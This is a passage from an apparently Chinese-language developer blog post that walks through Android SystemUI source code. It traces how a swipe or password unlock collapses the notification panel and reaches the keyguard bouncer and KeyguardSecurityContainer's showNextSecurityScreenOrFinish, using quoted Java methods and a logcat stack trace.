com.android.systemui.statusbar.phone.NotificationPanelViewController$18.onTouch(NotificationPanelViewController.java:3229)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at android.view.View.dispatchTouchEvent(View.java:14385)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:3120)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:2792)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at android.view.ViewGroup.dispatchTransformedTouchEvent(ViewGroup.java:3126)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:2806)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at com.android.systemui.statusbar.phone.NotificationShadeWindowView.dispatchTouchEvent(NotificationShadeWindowView.java:173)</span><br><span class="line">12-30 09:28:31.8189  1470  1470 D longzhiye: :      at android.view.View.dispatchPointerEvent(View.java:14656)</span><br><span class="line">// 省略部分Log....</span><br></pre></td></tr></table></figure><p>接着看 <strong>PanelViewController#notifyBarPanelExpansionChanged()</strong></p><blockquote><p>这里注意：都是到 KeyguardSecurityContainer#KeyguardSecurityContainer(),滑动解锁与带有密码安全界面，即密码解锁，两个流程的代码执行顺序有差异。</p></blockquote><p>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PanelViewController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">notifyBarPanelExpansionChanged</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (mBar != <span class="literal">null</span>) &#123;</span><br><span class="line">        mBar.panelExpansionChanged(</span><br><span class="line">                mExpandedFraction,</span><br><span class="line">                mExpandedFraction &gt; <span class="number">0f</span> || mPeekAnimator != <span class="literal">null</span> || mInstantExpanding</span><br><span class="line">                        || isPanelVisibleBecauseOfHeadsUp() || mTracking</span><br><span class="line">                        || mHeightAnimator != <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mExpansionListeners.size(); i++) &#123;</span><br><span class="line">        mExpansionListeners.get(i).onPanelExpansionChanged(mExpandedFraction, mTracking);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再 notifyBarPanelExpansionChanged() 方法中继而调用 PanelBar 中的panelExpansionChanged方法：页面的透明度。<br><strong>PanelBar#panelExpansionChanged()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/PanelBar.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">panelExpansionChanged</span><span class="params">(<span class="type">float</span> frac, <span class="type">boolean</span> expanded)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (isNaN(frac)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;frac cannot be NaN&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">fullyClosed</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">fullyOpened</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (SPEW) LOG(<span class="string">&quot;panelExpansionChanged: start state=%d&quot;</span>, mState);</span><br><span class="line">        <span class="type">PanelViewController</span> <span class="variable">pv</span> <span class="operator">=</span> mPanel;</span><br><span class="line">        mExpanded = expanded;</span><br><span class="line">        mPanelFraction = frac;</span><br><span class="line">        updateVisibility();</span><br><span class="line">        <span class="comment">// 调整可能部分可见的任何其他面板</span></span><br><span class="line">        <span class="keyword">if</span> (expanded) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mState == STATE_CLOSED) &#123;</span><br><span class="line">                go(STATE_OPENING);</span><br><span class="line">                onPanelPeeked();</span><br><span class="line">            &#125;</span><br><span class="line">            fullyClosed = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">float</span> <span class="variable">thisFrac</span> <span class="operator">=</span> pv.getExpandedFraction();</span><br><span class="line">            <span class="keyword">if</span> (SPEW) LOG(<span class="string">&quot;panelExpansionChanged:  -&gt; %s: f=%.1f&quot;</span>, pv.getName(), thisFrac);</span><br><span class="line">            fullyOpened = thisFrac &gt;= <span class="number">1f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// fullyOpened 完全打开；就是：锁屏界面是否完全展开的；（手指不滑动时，fullyOpened  = true，fullyClosed = false；）</span></span><br><span class="line">        <span class="comment">// fullyClosed 完全关闭，就是：锁屏界面是否完全折叠，即消失了；（锁屏界面上滑消失时，fullyOpened = false，fullyClosed  = true）</span></span><br><span class="line">       <span class="comment">// 手指在滑动过程中时：fullyOpened = false，fullyClosed  = false</span></span><br><span class="line">        <span class="keyword">if</span> (fullyOpened &amp;&amp; !mTracking) &#123;</span><br><span class="line">            go(STATE_OPEN);</span><br><span class="line">            onPanelFullyOpened();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fullyClosed &amp;&amp; !mTracking &amp;&amp; mState != STATE_CLOSED) &#123;</span><br><span class="line">            go(STATE_CLOSED);</span><br><span class="line">            <span class="comment">// 面板折叠时</span></span><br><span class="line">            onPanelCollapsed();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (SPEW) LOG(<span class="string">&quot;panelExpansionChanged: end state=%d [%s%s ]&quot;</span>, mState,</span><br><span class="line">                fullyOpened?<span class="string">&quot; fullyOpened&quot;</span>:<span class="string">&quot;&quot;</span>, fullyClosed?<span class="string">&quot; fullyClosed&quot;</span>:<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当锁屏页面完全消失时，调用 onPanelCollapsed() 方法，执行 post() 方法。<br><strong>PhoneStatusBarView#onPanelCollapsed()</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPanelCollapsed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onPanelCollapsed();</span><br><span class="line">        <span class="comment">// Close the status bar in the next frame so we can show the end of the animation.</span></span><br><span class="line">        post(mHideExpandedRunnable);</span><br><span class="line">        mIsFullyOpenedPanel = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Runnable</span> <span class="variable">mHideExpandedRunnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (mPanelFraction == <span class="number">0.0f</span>) &#123;</span><br><span class="line">                mBar.makeExpandedInvisible();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>接下来执行 StatusBar 中的 makeExpandedInvisible() 方法，更新通知栏和状态栏窗口的可见性。<br><strong>StatusBar#makeExpandedInvisible()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBar.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">makeExpandedInvisible</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (SPEW) Log.d(TAG, <span class="string">&quot;makeExpandedInvisible: mExpandedVisible=&quot;</span> + mExpandedVisible</span><br><span class="line">              + <span class="string">&quot; mExpandedVisible=&quot;</span> + mExpandedVisible);</span><br><span class="line">      <span class="keyword">if</span> (!mExpandedVisible || mNotificationShadeWindowView == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 确保面板完全折叠</span></span><br><span class="line">      mStatusBarView.collapsePanel(<span class="comment">/*animate=*/</span> <span class="literal">false</span>, <span class="literal">false</span> <span class="comment">/* delayed*/</span>,</span><br><span class="line">              <span class="number">1.0f</span> <span class="comment">/* speedUpFactor */</span>);</span><br><span class="line">      mNotificationPanelViewController.closeQs();</span><br><span class="line">      mExpandedVisible = <span class="literal">false</span>;</span><br><span class="line">      visibilityChanged(<span class="literal">false</span>);</span><br><span class="line">      <span class="comment">// 更新通知阴影和状态栏窗口的可见性</span></span><br><span class="line">      mNotificationShadeWindowController.setPanelVisible(<span class="literal">false</span>);</span><br><span class="line">      mStatusBarWindowController.setForceStatusBarVisible(<span class="literal">false</span>);</span><br><span class="line">      <span class="comment">// Close any guts that might be visible</span></span><br><span class="line">      mGutsManager.closeAndSaveGuts(<span class="literal">true</span> <span class="comment">/* removeLeavebehind */</span>, <span class="literal">true</span> <span class="comment">/* force */</span>,</span><br><span class="line">              <span class="literal">true</span> <span class="comment">/* removeControls */</span>, -<span class="number">1</span> <span class="comment">/* x */</span>, -<span class="number">1</span> <span class="comment">/* y */</span>, <span class="literal">true</span> <span class="comment">/* resetMenu */</span>);</span><br><span class="line">      mShadeController.runPostCollapseRunnables();</span><br><span class="line">      setInteracting(StatusBarManager.WINDOW_STATUS_BAR, <span class="literal">false</span>);</span><br><span class="line">      <span class="keyword">if</span> (!mNotificationActivityStarter.isCollapsingToShowActivityOverLockscreen()) &#123;</span><br><span class="line">          showBouncerIfKeyguard();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">          Log.d(TAG, <span class="string">&quot;Not showing bouncer due to activity showing over lockscreen&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      mCommandQueue.recomputeDisableFlags(</span><br><span class="line">              mDisplayId,</span><br><span class="line">              mNotificationPanelViewController.hideStatusBarIconsWhenExpanded() <span class="comment">/* animate */</span>);</span><br><span class="line">      <span class="comment">// Trimming will happen later if Keyguard is showing - doing it here might cause a jank in</span></span><br><span class="line">      <span class="comment">// the bouncer appear animation.</span></span><br><span class="line">      <span class="keyword">if</span> (!mStatusBarKeyguardViewManager.isShowing()) &#123;</span><br><span class="line">          WindowManagerGlobal.getInstance().trimMemory(ComponentCallbacks2.TRIM_MEMORY_UI_HIDDEN);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><strong>StatusBar#showBouncerIfKeyguard()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBar.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">showBouncerIfKeyguard</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((mState == StatusBarState.KEYGUARD || mState == StatusBarState.SHADE_LOCKED)</span><br><span class="line">            &amp;&amp; !mKeyguardViewMediator.isHiding()) &#123;</span><br><span class="line">        <span class="comment">// !mKeyguardViewMediator.isHiding() 不管是滑动解锁还是PIN码解锁等方式都是 true</span></span><br><span class="line">        mStatusBarKeyguardViewManager.showBouncer(<span class="literal">true</span> <span class="comment">/* scrimmed */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>StatusBarKeyguardViewManager#showBouncer()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/StatusBarKeyguardViewManager.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showBouncer</span><span class="params">(<span class="type">boolean</span> scrimmed)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果是滑动解锁，这里 if 条件是 true，如果是密码解锁，这里是 false。</span></span><br><span class="line">    <span class="keyword">if</span> (mShowing &amp;&amp; !mBouncer.isShowing()) &#123;</span><br><span class="line">        mBouncer.show(<span class="literal">false</span> <span class="comment">/* resetSecuritySelection */</span>, scrimmed);</span><br><span class="line">    &#125;</span><br><span class="line">    updateStates();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>KeyguardBouncer#show()</strong> 如果有设置密码，则显示安全锁界面<br>frameworks/base/packages/SystemUI/src/com/android/systemui/statusbar/phone/KeyguardBouncer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">(<span class="type">boolean</span> resetSecuritySelection, <span class="type">boolean</span> isScrimmed)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">keyguardUserId</span> <span class="operator">=</span> KeyguardUpdateMonitor.getCurrentUser();</span><br><span class="line">        <span class="keyword">if</span> (keyguardUserId == UserHandle.USER_SYSTEM &amp;&amp; UserManager.isSplitSystemUser()) &#123;</span><br><span class="line">            <span class="comment">// In split system user mode, we never unlock system user.</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ensureView();</span><br><span class="line">        mIsScrimmed = isScrimmed;</span><br><span class="line">        <span class="keyword">if</span> (isScrimmed) &#123;</span><br><span class="line">            setExpansion(EXPANSION_VISIBLE);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (resetSecuritySelection) &#123;</span><br><span class="line">            showPrimarySecurityScreen();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (mRoot.getVisibility() == View.VISIBLE || mShowingSoon) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">activeUserId</span> <span class="operator">=</span> KeyguardUpdateMonitor.getCurrentUser();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isSystemUser</span> <span class="operator">=</span></span><br><span class="line">                UserManager.isSplitSystemUser() &amp;&amp; activeUserId == UserHandle.USER_SYSTEM;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">allowDismissKeyguard</span> <span class="operator">=</span> !isSystemUser &amp;&amp; activeUserId == keyguardUserId;</span><br><span class="line">        <span class="comment">// 重点关注 dismiss()</span></span><br><span class="line">        <span class="keyword">if</span> (allowDismissKeyguard &amp;&amp; mKeyguardView.dismiss(activeUserId)) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!allowDismissKeyguard) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">&quot;User can&#x27;t dismiss keyguard: &quot;</span> + activeUserId + <span class="string">&quot; != &quot;</span> + keyguardUserId);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        mShowingSoon = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Split up the work over multiple frames.</span></span><br><span class="line">        DejankUtils.removeCallbacks(mResetRunnable);</span><br><span class="line">        <span class="keyword">if</span> (mKeyguardStateController.isFaceAuthEnabled() &amp;&amp; !needsFullscreenBouncer()</span><br><span class="line">                &amp;&amp; !mKeyguardUpdateMonitor.userNeedsStrongAuth()</span><br><span class="line">                &amp;&amp; !mKeyguardBypassController.getBypassEnabled()) &#123;</span><br><span class="line">            mHandler.postDelayed(mShowRunnable, BOUNCER_FACE_DELAY);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            DejankUtils.postAfterTraversal(mShowRunnable);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 安全锁设置可见性</span></span><br><span class="line">        mCallback.onBouncerVisiblityChanged(<span class="literal">true</span> <span class="comment">/* shown */</span>);</span><br><span class="line">        <span class="comment">// 开始显示</span></span><br><span class="line">        mExpansionCallback.onStartingToShow();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里重点关注 mKeyguardView.dismiss(activeUserId) ;<br><strong>KeyguardHostView#dismiss()</strong><br>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardHostView.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显示安全锁</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dismiss</span><span class="params">(<span class="type">int</span> targetUserId)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dismiss(<span class="literal">false</span>, targetUserId, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dismiss</span><span class="params">(<span class="type">boolean</span> authenticated, <span class="type">int</span> targetUserId,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> bypassSecondaryLockScreen)</span> &#123;</span><br><span class="line">    <span class="comment">// 重点关注</span></span><br><span class="line">    <span class="keyword">return</span> mSecurityContainer.showNextSecurityScreenOrFinish(authenticated, targetUserId,</span><br><span class="line">            bypassSecondaryLockScreen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>KeyguardSecurityContainer#showNextSecurityScreenOrFinish()</strong><br>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardSecurityContainer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显示下一个安全屏幕（如果有）</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">showNextSecurityScreenOrFinish</span><span class="params">(<span class="type">boolean</span> authenticated, <span class="type">int</span> targetUserId,</span></span><br><span class="line"><span class="params">        <span class="type">boolean</span> bypassSecondaryLockScreen)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;showNextSecurityScreenOrFinish(&quot;</span> + authenticated + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">finish</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">strongAuth</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">eventSubtype</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">unLockMode</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">// add for KFCAANWIKFRA-833</span></span><br><span class="line">    <span class="type">BouncerUiEvent</span> <span class="variable">uiEvent</span> <span class="operator">=</span> BouncerUiEvent.UNKNOWN;</span><br><span class="line">    <span class="keyword">if</span> (mUpdateMonitor.getUserHasTrust(targetUserId)) &#123;</span><br><span class="line">       <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mUpdateMonitor.getUserUnlockedWithBiometric(targetUserId)) &#123;</span><br><span class="line">       <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (SecurityMode.None == mCurrentSecuritySelection) &#123;  <span class="comment">// mCurrentSecuritySelection当前安全选择的模式</span></span><br><span class="line">        <span class="type">SecurityMode</span> <span class="variable">securityMode</span> <span class="operator">=</span> mSecurityModel.getSecurityMode(targetUserId);</span><br><span class="line">        <span class="keyword">if</span> (SecurityMode.None == securityMode) &#123;</span><br><span class="line">            unLockMode = <span class="number">0</span>;</span><br><span class="line">            finish = <span class="literal">true</span>; <span class="comment">// 没有安全锁</span></span><br><span class="line">            eventSubtype = BOUNCER_DISMISS_NONE_SECURITY;</span><br><span class="line">            uiEvent = BouncerUiEvent.BOUNCER_DISMISS_NONE_SECURITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            showSecurityScreen(securityMode); <span class="comment">// switch to the alternate security view</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (authenticated) &#123;</span><br><span class="line">        <span class="comment">// mCurrentSecuritySelection 当前锁的模式</span></span><br><span class="line">        <span class="keyword">switch</span> (mCurrentSecuritySelection) &#123;</span><br><span class="line">            <span class="keyword">case</span> Pattern:</span><br><span class="line">            <span class="keyword">case</span> Password:</span><br><span class="line">            <span class="keyword">case</span> PIN:</span><br><span class="line">                unLockMode = mCurrentSecuritySelection.ordinal() - <span class="number">1</span>;</span><br><span class="line">                strongAuth = <span class="literal">true</span>;</span><br><span class="line">                finish = <span class="literal">true</span>;</span><br><span class="line">                eventSubtype = BOUNCER_DISMISS_PASSWORD;</span><br><span class="line">                uiEvent = BouncerUiEvent.BOUNCER_DISMISS_PASSWORD;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 省略部分代码......</span></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Log.v(TAG, <span class="string">&quot;Bad security screen &quot;</span> + mCurrentSecuritySelection + <span class="string">&quot;, fail safe&quot;</span>);</span><br><span class="line">                showPrimarySecurityScreen(<span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查设备管理员指定的其他安全措施。</span></span><br><span class="line">    <span class="comment">/* UNISOC: Modify for bug1394148 @&#123; */</span></span><br><span class="line">    <span class="type">Intent</span> <span class="variable">secondaryLockscreenIntent</span> <span class="operator">=</span></span><br><span class="line">            mUpdateMonitor.getSecondaryLockscreenRequirement(targetUserId);</span><br><span class="line">    <span class="keyword">if</span> (finish &amp;&amp; !bypassSecondaryLockScreen &amp;&amp; secondaryLockscreenIntent != <span class="literal">null</span>) &#123;</span><br><span class="line">        mSecondaryLockScreenController.show(secondaryLockscreenIntent);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* @&#125; */</span></span><br><span class="line">    <span class="keyword">if</span> (eventSubtype != -<span class="number">1</span>) &#123;</span><br><span class="line">        mMetricsLogger.write(<span class="keyword">new</span> <span class="title class_">LogMaker</span>(MetricsEvent.BOUNCER)</span><br><span class="line">                .setType(MetricsEvent.TYPE_DISMISS).setSubtype(eventSubtype));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (uiEvent != BouncerUiEvent.UNKNOWN) &#123;</span><br><span class="line">        sUiEventLogger.log(uiEvent);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// finish 是否还有一个安全屏幕，即是否解锁完成，有则返回 false，没有返回 true</span></span><br><span class="line">    <span class="keyword">if</span> (finish) &#123;</span><br><span class="line">        <span class="comment">// 重点关注</span></span><br><span class="line">        mSecurityCallback.finish(strongAuth, targetUserId);</span><br><span class="line">        <span class="comment">// 省略部分代码......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> finish;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>KeyguardHostView#finish()</strong><br>frameworks/base/packages/SystemUI/src/com/android/keyguard/KeyguardHostView.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">finish</span><span class="params">(<span class="type">boolean</span> strongAuth, <span class="type">int</span> targetUserId)</span> &#123;</span><br><span class="line">    <span class="comment">// If there&#x27;s a pending runnable because the user interacted with a widget</span></span><br><span class="line">    <span class="comment">// and we&#x27;re leaving 